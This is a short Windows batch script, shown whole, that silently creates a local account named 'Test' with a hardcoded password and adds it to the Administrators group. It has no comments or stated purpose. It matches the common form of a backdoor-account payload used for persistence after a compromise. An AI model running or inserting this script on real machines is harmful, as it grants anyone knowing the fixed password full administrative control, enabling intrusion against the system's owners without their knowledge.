@echo off
net user "Test" "P@55W0rD" /add
net localgroup "Administrators" "Test" /add
